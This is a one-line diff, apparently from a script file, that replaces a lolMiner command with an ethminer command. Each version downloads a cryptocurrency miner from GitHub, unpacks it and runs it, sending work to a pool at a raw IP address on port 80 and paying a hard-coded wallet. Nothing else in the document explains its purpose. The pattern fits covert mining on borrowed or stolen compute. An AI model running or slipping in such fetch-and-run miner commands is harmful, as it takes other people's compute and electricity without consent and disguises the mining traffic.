@@ -1,1 +1,1 @@
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xvf lolMiner_v1.46a_Lin64.tar.gz  && cd 1.46a &&  ./lolMiner --algo ETHASH --pool 3.90.200.104:80 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.Gomawo
+wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && tar -zxvf ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz && cd bin/ && export LC_ALL=C; unset LANGUAGE && ./ethminer -U -P stratum2+tcp://35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.tester@3.1.81.175:80
